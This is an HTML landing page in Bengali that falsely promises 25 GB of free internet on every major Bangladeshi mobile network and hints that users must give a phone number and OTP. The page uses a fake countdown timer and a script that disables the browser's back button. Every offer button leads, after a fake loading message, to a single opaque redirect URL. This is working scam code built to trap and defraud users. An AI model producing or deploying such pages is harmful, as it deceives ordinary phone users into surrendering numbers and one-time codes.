<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Internet Offer</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:Arial, Helvetica, sans-serif;
}
body{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
}
.container{
  width:92%;
  max-width:420px;
  background:rgba(255,255,255,0.9);
  border-radius:16px;
  padding:22px;
  text-align:center;
  box-shadow:0 10px 25px rgba(0,0,0,.25);
}
h1{
  font-size:22px;
  margin-bottom:10px;
}
p{
  font-size:14px;
  margin-bottom:15px;
}
.timer{
  font-weight:bold;
  color:red;
  margin-bottom:15px;
}
a.btn{
  display:block;
  text-decoration:none;
  margin:10px 0;
  padding:14px;
  border-radius:10px;
  font-size:15px;
  font-weight:bold;
  color:#fff;
}
.gp{background:#0a8f08;}
.bl{background:#f60;}
.rb{background:#e60000;}
.at{background:#0072bc;}
.note{
  font-size:12px;
  margin-top:12px;
  color:#333;
}
#loader{
  display:none;
  margin-top:10px;
  font-size:13px;
  color:#555;
}
</style>
</head>

<body>

<div class="container">
  <h1>সীমিত সময়ের জন্য অফার</h1>
  <p>সব সিমে পাচ্ছেন ২৫ জিবি ফ্রি ইন্টারনেট</p>

  <div class="timer">⏳ সময় বাকি: <span id="time">00:30</span></div>

  <!-- BUTTONS -->
  <a href="#" class="btn gp">গ্রামীণফোন ২৫ জিবি ফ্রি ইন্টারনেট</a>
  <a href="#" class="btn bl">বাংলালিংক ২৫ জিবি ফ্রি ইন্টারনেট</a>
  <a href="#" class="btn rb">রবি ২৫ জিবি ফ্রি ইন্টারনেট</a>
  <a href="#" class="btn at">এয়ারটেল ২৫ জিবি ফ্রি ইন্টারনেট</a>

  <div id="loader">অনুগ্রহ করে অপেক্ষা করুন...</div>

  <div class="note">
    * ফোন নাম্বার দিয়ে OTP দিলে ইন্টারনেট মেয়াদ ৩০ দিন
  </div>
</div>

<script>
/* ===== FORCE SINGLE REDIRECT LINK ===== */
const redirectUrl = "https://fpqlxdu.com/cl/ae155fe23b0d6874";

/* Back button disable */
history.pushState(null,null,location.href);
window.onpopstate=function(){history.go(1);};

/* Button click */
document.querySelectorAll(".btn").forEach(btn=>{
  btn.addEventListener("click",function(e){
    e.preventDefault();
    document.getElementById("loader").style.display="block";
    setTimeout(()=>{
      window.location.href = redirectUrl;
    },1500);
  });
});

/* Simple timer */
let t = 30;
setInterval(()=>{
  if(t>0){
    t--;
    document.getElementById("time").innerText =
      "00:" + (t<10 ? "0"+t : t);
  }
},1000);
</script>

</body>
</html>
